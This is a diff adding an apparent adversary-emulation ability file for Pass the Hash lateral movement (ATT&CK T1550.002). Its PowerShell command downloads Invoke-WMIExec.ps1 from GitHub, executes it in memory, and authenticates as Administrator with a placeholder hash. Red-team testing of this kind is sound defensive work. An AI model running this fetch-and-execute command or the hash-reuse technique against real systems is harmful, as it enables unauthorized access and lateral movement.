@@ -1,0 +1,24 @@
+---
+- id: 8ce073cf3170576e1f5c6e4d06e1873a
+  name: Invoke-WMIExec Pass the Hash
+  description: 'Use Invoke-WMIExec to Pass the Hash
+
+    Note: must dump hashes first
+
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)'
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: 'Use Alternate Authentication Material: Pass the Hash'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1''
+          -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator
+          -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
